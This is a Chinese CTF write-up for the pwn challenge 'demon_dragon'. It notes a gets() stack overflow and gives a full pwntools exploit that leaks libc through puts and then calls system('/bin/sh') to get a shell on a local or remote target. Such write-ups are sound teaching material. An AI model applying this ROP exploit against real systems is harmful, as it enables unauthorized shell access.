## demon_dragon

- 题目描述：

  > 在Demon Dragon的巢穴入口，你遇到了一位女巫。
  >
  > 女巫说： 金克木，木克土，土克水，水克火，火克金。 
  >
  > By *Mercurio*    						
  
 - 题目附件：

   > [demon_dragon](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/DemonDragon/demon_dragon)
   >
   > [libmagic.so](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/DemonDragon/libmagic.so)

 - 考察点：动态链接？栈溢出

 - 难度：简单

 - 初始分值：300

 - 最终分值：299

 - 完成人数：2

### 程序分析

需要加载附件给的动态库，直接扔到`/lib`目录下即可在本地运行程序。

动态库里有乱七八糟一堆函数，都没有什么用，下面这个函数里有很明显的栈溢出，直接`ROP`带走即可

```c
__int64 sub_400C41(){
	// ...
    printf(
    "Suddenly, the Demon Dragon attacked you with %s, %s, %s, %s, %s!\n\n",
    (char *)v2 + 6 * dword_6020B0,
    (char *)v2 + 6 * dword_6020B4,
    (char *)v2 + 6 * dword_6020B8,
    (char *)v2 + 6 * dword_6020BC,
    (char *)v2 + 6 * dword_6020C0);
  printf("What are you going to do?!!\nSkill > ");
  return gets(&v1);
}
```

### exp

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './demon_dragon'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000400e43 # pop rdi ; ret

# elf, libc
main = 0x00400D6E
# rop1
offset = 72
payload = 'A'*offset
payload += p64(prdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(main)

ru('Skill > ')
# debug()
sl(payload)
puts = uu64(rc(6))
info_addr('puts',puts)
libc_base = puts - libc.sym['puts']
info_addr('base',libc_base)
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()

# rop2
ru('Skill > ')
payload2 = 'B'*offset
payload2 += p64(prdi) + p64(binsh) + p64(system) + p64(main)
debug()
sl(payload2)
# log.warning('--------------')

p.interactive()
```

